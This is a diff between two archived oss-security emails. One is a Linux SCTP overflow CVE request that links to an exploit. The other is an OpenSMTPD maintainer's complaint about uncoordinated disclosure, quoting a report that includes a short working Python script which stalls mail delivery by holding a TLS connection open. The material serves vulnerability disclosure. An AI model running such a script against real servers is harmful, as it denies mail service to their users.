@@ -1,35 +1,72 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2013/03/08/3
-Message-ID: <20130308034744.GD20032@dhcp-25-225.brq.redhat.com>
-Date: Fri, 8 Mar 2013 04:47:44 +0100
-From: Petr Matousek <pmatouse@...hat.com>
-To: oss-security@...ts.openwall.com, spender@...ecurity.net, Kurt Seifried <kseifrie@...hat.com>
-Subject: Re: CVE Request -- Linux kernel: sctp: SCTP_GET_ASSOC_STATS stack overflow
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2013/05/18/9
+Message-ID: <20130518161643.GA12530@poolp.org>
+Date: Sat, 18 May 2013 18:16:43 +0200
+From: Gilles Chehade <gilles@...lp.org>
+To: "Jason A. Donenfeld" <Jason@...c4.com>
+Cc: oss-security <oss-security@...ts.openwall.com>, misc@...nsmtpd.org
+Subject: Re: CVE Request: DoS in OpenSMTPD TLS Support
 Content-Type: text/plain; charset=utf-8
 
-It's stack buffer overflow, not stack overflow, sorry.
+Erf...
 
-On Fri, Mar 08, 2013 at 04:23:49AM +0100, Petr Matousek wrote:
-> A local user could use the missing size check in
-> sctp_getsockopt_assoc_stats() function to escalate their privileges. On
-> x86 this might be mitigated by destination object size check as the
-> destination size is known at compile time.
-> 
-> Upstream fix:
-> http://git.kernel.org/cgit/linux/kernel/git/torvalds/linux.git/commit/?id=726bc6b0
-> 
-> Introduced by:
-> http://git.kernel.org/cgit/linux/kernel/git/torvalds/linux.git/commit/?id=196d6759
-> 
-> Introduced in:
-> v3.8-rc1
-> 
-> References:
-> https://twitter.com/grsecurity/status/309805924749541376
-> http://grsecurity.net/~spender/sctp.c
+Not too nice to send a CVE request without ANY coordination with us ...
 
-https://bugzilla.redhat.com/show_bug.cgi?id=919315
+Just for the record, you contacted us today reporting a bug which could
+be memory corruption and you didn't know if it could be exploited. Then
+I replied telling you that we discovered and fixed the bug two days ago
+and I then explained to you what the bug really was (wrong logic in the
+IO events handling code in our SSL layer). I then told you that we made
+snapshots with the fix applied AND that we has planned for a release on
+*Monday* with the fixes backported.
 
-Thanks,
+The snapshot mail, commit log and diffs makes the issue obvious, I just
+don't understand why you had to go and publish *RIGHT AWAY* a script on
+public lists after our mail exchange...
+
+I'm not mad that you disclosed a bug, we're very open about it, and the
+git history is full of references to crash and security fixes, but it's
+just REALLY not nice how you handled this and are forcing me to do this
+release in a hurry rather than handling it with package maintainers.
+
+Next time, please coordinate a little, just to be nice.
+
+
+On Sat, May 18, 2013 at 04:27:22PM +0200, Jason A. Donenfeld wrote:
+> Hi Kurt,
+> 
+> The SSL handling in the latest OpenSMTPD (5.3.1) misconfigures its
+> sockets in blocking mode, allowing an attacker to prevent all mail
+> delivery simply by holding a socket open.
+> 
+> I discovered this accidentally, as I noticed my HP printer's smtp
+> client would keep the connection indefinitely open after an
+> unsuccessful authentication attempt, causing no more mail to be
+> delivered until I SIGKILL'd my smtpd process or unplugged my printer.
+> 
+> The following reproduces the attack trivially:
+> 
+>     #!/usr/bin/env python2
+>     import smtplib
+>     import time
+>     print "[+] Connecting to server and initiating TLS"
+>     smtp = smtplib.SMTP("mail.some-vitim-host.blah", 587)
+>     smtp.starttls()
+>     print "[+] No clients will be able to connect as long as this remains open."
+>     time.sleep(100000000)
+> 
+> Apparently this was fixed recently upstream, noting "evil client" in
+> the commit message:
+> http://git.zx2c4.com/OpenSMTPD/commit/?id=38b26921bad5fe24ad747bf9d591330d683728b0
+> 
+> A snapshot has been posted to http://www.opensmtpd.org/archives/ , but
+> no patch release has yet been made.
+> 
+> Jason
+> 
+
+
 -- 
-Petr Matousek / Red Hat Security Response Team
+Gilles Chehade
+
+https://www.poolp.org                                          @poolpOrg
